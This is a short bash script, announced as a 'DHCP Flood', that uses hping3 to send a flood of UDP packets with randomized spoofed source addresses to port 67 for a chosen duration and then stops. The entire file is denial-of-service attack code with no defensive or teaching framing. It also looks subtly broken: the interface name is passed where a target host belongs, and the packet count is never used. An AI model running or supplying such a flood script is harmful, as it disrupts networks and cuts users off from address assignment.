#!/bin/bash
INTERFACE=${1:-eth0}
DURATION=${2:-60}
COUNT=${3:-1000}

echo "[+] DHCP Flood on $INTERFACE for $DURATION seconds ($COUNT pkts)"
sudo hping3 --udp -p 67 --flood --rand-source -i u1000 $INTERFACE &
PID=$!
sleep $DURATION
sudo kill $PID
echo "[+] Flood stopped."
